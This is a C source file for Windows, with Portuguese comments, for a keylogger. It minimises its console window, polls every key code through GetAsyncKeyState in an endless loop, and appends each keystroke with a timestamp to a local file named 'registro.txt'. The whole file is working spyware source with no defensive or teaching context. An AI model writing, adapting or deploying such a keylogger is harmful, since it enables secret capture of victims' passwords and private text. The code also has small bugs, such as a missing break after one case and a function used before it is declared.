#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#define LOG "registro.txt"

int main(void)
{
    ShowWindow(GetConsoleWindow(), SW_MINIMIZE); //Inicia minimizado
    time_t tempo = time(NULL);
    FILE *fp = fopen(LOG, "a+");

    if (fp == NULL)
    {
        perror("fopen");
        exit(1);
    }
    fprintf(fp, "DATA E HORARIO DOS DADOS: %s\n", ctime(&tempo));
    get_Keys(fp);
}

//Função que escreve no arquivo .txt as teclas digitadas
//Keys codes site https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
void get_Keys(FILE *fp)
{
    while (1)
    {
        Sleep(1);
        for (int i = 0; i < 255; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {

                switch (i)
                {
                case 0x09: 
                    fprintf(fp, "[TAB]");
                    break;
                case 0x1B: 
                    fprintf(fp, "\t");
                    break;
                case 0x20:
                    fprintf(fp, " ");
                    break;
                case 0x08: 
                    fprintf(fp, "[DELETE]");
                    break;
                case 0xBE:
                    fprintf(fp, ".");
                    break;
                case 0xBC:
                    fprintf(fp, ",");
                    break;
                case 0x14:
                    fprintf(fp, "[CAPSLK]");
                    break;
                case 0xA2:
                    fprintf(fp, "[LCTRL]");
                    break;
                case 0x5B:
                    fprintf(fp, "[WINDOWS]");
                    break;
                case 0xBD:
                    fprintf(fp, "-");
                    break;
                case 0xC0:
                    fprintf(fp, "~");
                    break;
                case 0xDD:
                    fprintf(fp, "[");
                case 0xDB:
                    fprintf(fp, "]");
                    break;
                case 0xBF:
                    fprintf(fp, "/");
                    break;
                default:
                    putc(i, fp);
                }
            }
        }
    }
}
